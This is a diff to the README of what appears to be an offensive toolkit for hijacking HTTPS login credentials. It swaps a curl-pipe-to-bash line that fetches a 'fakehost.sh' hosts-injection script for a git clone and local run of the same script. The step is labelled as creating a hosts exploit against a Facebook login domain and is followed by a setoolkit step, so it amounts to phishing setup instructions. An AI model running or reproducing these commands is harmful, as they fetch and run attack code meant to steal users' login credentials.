@@ -23,7 +23,10 @@ $ pip install -r requirements.txt
 
 1. - Creating hosts exploit facebook.login.com
 ```bash
-curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/master/Attacker/hosts_fake_inject/fakehost.sh | bash
+git clone https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials.git
+cd SSTC-HTTPS-hijack-login-credentials/Attacker/hosts_fake_inject
+bash fakehost.sh
+     follow the instruction...
 ```
 
 2. - setoolkit
